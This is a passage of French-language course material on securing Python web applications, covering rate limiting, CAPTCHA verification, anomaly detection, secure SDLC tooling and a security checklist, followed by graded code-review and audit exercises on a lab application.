**Déroulement du rate limiting** : chaque requête est comptée par clé (IP, user_id, endpoint). Quand le seuil est dépassé, le serveur retourne 429 avec un en-tête Retry-After.

```mermaid
sequenceDiagram
    participant C as Client
    participant L as Rate Limiter (Redis)
    participant S as Application
    C->>L: POST /login (IP: 1.2.3.4)
    L->>L: Compteur : 1/5
    L-->>S: OK
    S-->>C: 200 OK
    Note over C,L: Requêtes suivantes...
    C->>L: POST /login (IP: 1.2.3.4)
    L->>L: Compteur : 5/5 (seuil atteint)
    L-->>S: BLOQUÉ
    S-->>C: 429 Too Many Requests<br/>Retry-After: 60
```

### 2.6.2 CAPTCHA (reCAPTCHA v3)

```python
# captcha.py
import requests

class CaptchaService:
    SECRET = os.environ.get('RECAPTCHA_SECRET')
    THRESHOLD = 0.5  # Score minimum (v3)

    @classmethod
    def verify(cls, token: str, action: str, remote_ip: str = None) -> bool:
        try:
            response = requests.post(
                'https://www.google.com/recaptcha/api/siteverify',
                data={
                    'secret': cls.SECRET,
                    'response': token,
                    'remoteip': remote_ip
                },
                timeout=5
            )
            data = response.json()
            return (
                data.get('success', False) and
                data.get('score', 0) >= cls.THRESHOLD and
                data.get('action') == action
            )
        except Exception:
            return False

@app.route('/register', methods=['POST'])
def register():
    captcha_token = request.form.get('g-recaptcha-response')
    if not CaptchaService.verify(captcha_token, 'register', request.remote_addr):
        return jsonify({'error': 'Captcha invalide'}), 400
    # Suite de l'inscription...
```

### 2.6.3 Détection de comportements suspects

```python
# anomaly_detection.py
from collections import defaultdict
from datetime import datetime, timedelta

class AnomalyDetector:
    """Détection basique de comportements suspects"""

    @staticmethod
    def check_login_anomalies(user, request):
        """Vérifie les anomalies à la connexion"""
        alerts = []

        # Nouvelle localisation géographique
        ip_country = get_country_from_ip(request.remote_addr)
        if user.last_login_country and ip_country != user.last_login_country:
            alerts.append({
                'type': 'new_country',
                'severity': 'medium',
                'data': {'country': ip_country}
            })

        # Connexion depuis nouveau device
        device_fingerprint = generate_device_fingerprint(request)
        if device_fingerprint not in user.known_devices:
            alerts.append({
                'type': 'new_device',
                'severity': 'low',
                'data': {'fingerprint': device_fingerprint}
            })

        # Heure inhabituelle
        hour = datetime.utcnow().hour
        if user.typical_hours and hour not in user.typical_hours:
            alerts.append({
                'type': 'unusual_time',
                'severity': 'low'
            })

        return alerts

    @staticmethod
    def handle_alerts(user, alerts):
        """Réponse adaptative aux alertes"""
        severity_max = max((a['severity'] for a in alerts), default='none')

        if severity_max == 'high':
            # Bloquer + notifier
            user.locked_until = datetime.utcnow() + timedelta(hours=1)
            send_security_alert(user.email, alerts)
        elif severity_max == 'medium':
            # Demander MFA obligatoire
            return 'require_mfa'
        elif severity_max == 'low':
            # Notification seulement
            send_notification(user.email, alerts)

        return 'allow'
```

---

## Module 2.7 - Plan de sécurité applicative (20 min)

### 2.7.1 SDLC sécurisé

```mermaid
graph LR
    C[Conception] --> D[Développement]
    D --> T[Test]
    T --> DEP[Déploiement]
    C -.-> C1[Threat modeling<br/>Architecture review]
    D -.-> D1[Code review<br/>Linters<br/>Pre-commit hooks<br/>SCA]
    T -.-> T1[SAST<br/>DAST<br/>Pentest<br/>Dependency audit]
    DEP -.-> DEP1[Hardening<br/>Secrets mgmt<br/>Monitoring<br/>Incident response]
```

### 2.7.2 Outils Python pour le SDLC sécurisé

**SAST (Static Application Security Testing)** :

```bash
# Bandit - SAST Python
pip install bandit
bandit -r ./app -f json -o bandit_report.json

# Semgrep - patterns custom
pip install semgrep
semgrep --config=auto ./app
```

**SCA (Software Composition Analysis)** :

```bash
# Safety - vulnérabilités dans dépendances
pip install safety
safety check --json

# pip-audit - audit officiel PyPA
pip install pip-audit
pip-audit -r requirements.txt
```

**Pre-commit hooks** :

```yaml
# .pre-commit-config.yaml
repos:
  - repo: https://github.com/PyCQA/bandit
    rev: 1.7.5
    hooks:
      - id: bandit
        args: ['-r', 'app/']

  - repo: https://github.com/Yelp/detect-secrets
    rev: v1.4.0
    hooks:
      - id: detect-secrets
        args: ['--baseline', '.secrets.baseline']

  - repo: https://github.com/pypa/pip-audit
    rev: v2.6.1
    hooks:
      - id: pip-audit
```

### 2.7.3 Checklist Security by Design

```markdown
## ✅ Checklist complète Security by Design

### Authentification
- [ ] Mots de passe hashés avec Argon2 (ou bcrypt rounds≥12)
- [ ] Politique de mot de passe forte (≥12 chars, complexité)
- [ ] Vérification HaveIBeenPwned au signup
- [ ] MFA disponible (TOTP) pour comptes sensibles
- [ ] Protection brute force (rate limiting + lockout progressif)
- [ ] Réinitialisation par token à usage unique, expirant
- [ ] Pas d'énumération possible (timing constant)
- [ ] Régénération session après login (anti-fixation)
- [ ] Logout invalide réellement la session côté serveur

### Autorisation
- [ ] Principe du moindre privilège
- [ ] Vérification serveur systématique (jamais que client)
- [ ] Pas d'IDOR (filtrage par owner ou UUIDs)
- [ ] RBAC ou ABAC implémenté
- [ ] Mass assignment empêché (whitelist/schemas)

### Données
- [ ] Chiffrement au repos (AES-256-GCM)
- [ ] Chiffrement en transit (TLS 1.2+ uniquement)
- [ ] Minimisation des données (RGPD)
- [ ] PII jamais loggées
- [ ] Anonymisation/pseudonymisation où possible
- [ ] Politique de rétention définie et appliquée
- [ ] Procédures RGPD : accès, suppression, portabilité

### Validation et encodage
- [ ] Validation côté serveur (Pydantic/Marshmallow)
- [ ] Échappement contextuel (HTML, JS, SQL, URL)
- [ ] Requêtes paramétrées partout
- [ ] Templates avec auto-escape activé
- [ ] Pas de eval(), exec(), pickle non sécurisé

### Communication
- [ ] HTTPS obligatoire (HSTS preload)
- [ ] Headers de sécurité (Talisman)
- [ ] CSP stricte (pas de unsafe-inline si possible)
- [ ] Cookies : Secure, HttpOnly, SameSite=Strict
- [ ] CORS restrictif (pas de wildcard avec credentials)

### Infrastructure
- [ ] WAF en place (Cloudflare, AWS WAF, ModSecurity)
- [ ] Secrets dans vault (jamais en code)
- [ ] Dépendances scannées (Dependabot + safety)
- [ ] Container scanné (Trivy, Grype)
- [ ] Configuration durcie (CIS Benchmarks)
- [ ] Backups chiffrés et testés

### Monitoring et réponse
- [ ] Logs de sécurité centralisés (SIEM)
- [ ] Alertes sur événements critiques
- [ ] Détection d'anomalies
- [ ] Plan de réponse aux incidents documenté
- [ ] Tests de restauration de backup
- [ ] Bug bounty / programme de divulgation

### Processus
- [ ] Threat modeling à la conception
- [ ] Code review obligatoire (avec checklist sécu)
- [ ] SAST en CI/CD (Bandit, Semgrep)
- [ ] DAST périodique (ZAP, Burp)
- [ ] Pentest annuel
- [ ] Formation sécurité de l'équipe
- [ ] Veille CVE active
```

---

# 📝 EXERCICES SÉANCE 2

## Exercice 2.A - Revue de code sécurité (Rendu en fin de séance)
**Durée : 45 min - Pondération : 20%**

### Contexte
Vous êtes lead développeur. Un junior soumet une Pull Request avec une nouvelle feature. Vous devez réaliser la revue de sécurité.

### Code à analyser

Un fichier `pr_to_review.py` (~200 lignes) contenant volontairement **10 à 15 vulnérabilités** parmi :
- IDOR
- Mass Assignment
- SSTI
- CSRF non protégé
- Authentification faible
- Logs de données sensibles
- Hardcoded secrets
- Dépendance vulnérable
- Validation insuffisante
- Session non sécurisée

### Travail demandé

Produire un rapport `revue_code.md` contenant pour chaque vulnérabilité :

```markdown
## VULN-001 : [Titre]

**Fichier/Ligne** : pr_to_review.py:42
**Sévérité** : Critique / Élevée / Moyenne / Faible
**CWE** : CWE-XXX
**Score CVSS** : X.X

### Description
[Description de la vulnérabilité]

### Preuve / Exploitation possible
```python
# Code/payload démontrant l'exploitation
```

### Correction proposée
```python
# Code corrigé
```

### Justification
[Explication des choix techniques]
```

Plus un script `analyse_auto.py` qui :
1. Lance Bandit sur le code
2. Lance Safety sur les dépendances
3. Compare avec votre analyse manuelle
4. Génère un rapport consolidé

### Critères d'évaluation
- Nombre de vulnérabilités identifiées (40%)
- Pertinence du scoring CVSS (15%)
- Qualité des corrections (30%)
- Script d'analyse automatisé (15%)

---

## Exercice 2.B - Projet final : Audit et sécurisation complète
**À rendre 2 semaines après la séance - Pondération : 60%**

### Contexte
Vous devez réaliser un audit complet de VulnPyApp et livrer une version sécurisée prête pour la production.

### Livrables attendus

**1. Rapport d'audit de sécurité (`audit_report.pdf`)**

15-20 pages comprenant :
- Résumé exécutif (non-technique, 1 page)
- Méthodologie d'audit
- Inventaire des vulnérabilités (minimum 10) :
  - Au moins 2 critiques
  - Au moins 4 élevées
  - Classification OWASP Top 10 + CWE + CVSS
- Pour chaque vuln : PoC reproductible (script Python), impact métier, recommandation
- Matrice des risques résiduels après correction
- Roadmap de remédiation priorisée

**2. Code sécurisé (repository Git)**

Application VulnPyApp corrigée :
- Toutes les vulnérabilités identifiées corrigées
- Commits atomiques et documentés (un commit par fix)
- Suite de tests pytest validant les corrections (≥80% coverage des routes)
- Configuration sécurisée complète (Talisman, Limiter, etc.)
- Pre-commit hooks configurés (bandit, detect-secrets)
- CI/CD avec gates de sécurité (GitHub Actions ou GitLab CI)

Exemple de pipeline attendu :

```yaml
# .github/workflows/security.yml
name: Security Pipeline
on: [push, pull_request]

jobs:
  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - uses: actions/setup-python@v4
        with:
          python-version: '3.11'

      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install bandit safety pip-audit pytest pytest-cov

      - name: SAST - Bandit
        run: bandit -r app/ -f json -o bandit.json
        continue-on-error: false

      - name: SCA - Safety
        run: safety check --json

      - name: SCA - pip-audit
        run: pip-audit -r requirements.txt

      - name: Secret detection
        run: detect-secrets scan

      - name: Tests sécurité
        run: pytest tests/security/ --cov=app --cov-fail-under=80
```

**3. Suite de tests de sécurité**

Tests automatisés couvrant tous les types de vulnérabilités vus :

```python
# tests/security/test_full_security.py
import pytest
from app import create_app, db

class TestAuthenticationSecurity:
    """Tests d'authentification sécurisée"""

    def test_password_hashing_uses_argon2(self, client):
        """Les mots de passe sont hashés avec Argon2"""
        pass

    def test_password_policy_enforced(self, client):
        """La politique de mot de passe est appliquée"""
        weak_passwords = ['12345', 'password', 'aaaaaa']
        for pwd in weak_passwords:
            r = client.post('/register', json={
                'email': 'test@test.com', 'password': pwd
            })
            assert r.status_code == 400

    def test_brute_force_protection(self, client):
        """Protection contre le brute force après N échecs"""
        for i in range(6):
            client.post('/login', data={
                'email': 'admin@vulnpyapp.local', 'password': 'wrong'
            })
        r = client.post('/login', data={
            'email': 'admin@vulnpyapp.local', 'password': 'Admin123!'
        })
        assert 'locked' in r.json.get('error', '').lower()

    def test_timing_attack_resistance(self, client):
        """Pas d'énumération via timing"""
        import time
        # Tester avec utilisateur existant vs inexistant
        # Les temps doivent être similaires
        pass

class TestAuthorizationSecurity:
    def test_idor_protection_on_orders(self, client):
        """IDOR impossible sur les commandes"""
        pass

    def test_mass_assignment_blocked(self, client):
        """Mass assignment bloqué (is_admin)"""
        pass

class TestInjectionSecurity:
    def test_sqli_login_protected(self, client):
        pass

    def test_xss_search_protected(self, client):
        pass

    def test_ssti_protected(self, client):
        pass

class TestSessionSecurity:
    def test_session_regenerated_on_login(self, client):
        pass

    def test_cookies_have_security_flags(self, client):
        r = client.post('/login', data={...})
        cookie = r.headers.get('Set-Cookie', '')
        assert 'HttpOnly' in cookie
        assert 'Secure' in cookie
        assert 'SameSite=Strict' in cookie

class TestSecurityHeaders:
    def test_csp_header_present(self, client):
        r = client.get('/')
        assert 'Content-Security-Policy' in r.headers

    def test_hsts_header_present(self, client):
        r = client.get('/')
        assert 'Strict-Transport-Security' in r.headers
```

**4. Documentation Security by Design**

Document `security_design.md` (5-10 pages) :
- Architecture de sécurité de l'application (schémas)
- Politique de sécurité applicative
- Procédures opérationnelles :
  - Onboarding développeur (checklist sécu)
  - Procédure de patch d'urgence
  - Procédure de réponse aux incidents
  - Procédure de revue de code sécurité
- Modèle de threat modeling appliqué (STRIDE)
- Métriques de sécurité à suivre (KPI)

**5. Soutenance orale (15 min + 10 min Q&A)**

Présenter :
- Démo live d'une exploitation pré-correction
- Démo live de la même tentative post-correction
- Présentation du plan de sécurité
- Justification des choix techniques

### Critères d'évaluation détaillés

| Critère | Pondération | Détail |
|---------|-------------|--------|
| **Exhaustivité de l'audit** | 20% | Nombre et qualité des vulnérabilités identifiées |
| **Qualité des PoC** | 15% | Scripts Python reproductibles et documentés |
| **Qualité des corrections** | 25% | Code sécurisé, idiomatique, bien commenté |
| **Suite de tests** | 15% | Coverage, pertinence, automatisation |
| **CI/CD sécurité** | 10% | Pipeline fonctionnel avec gates |
| **Documentation** | 10% | Clarté, complétude, professionalisme |
| **Soutenance** | 5% | Maîtrise du sujet, démonstrations |

**Bonus possibles (+15% max)** :
- Intégration d'un WAF (ModSecurity)
- Mise en place de monitoring (logs structurés + alerting)
- Implémentation MFA T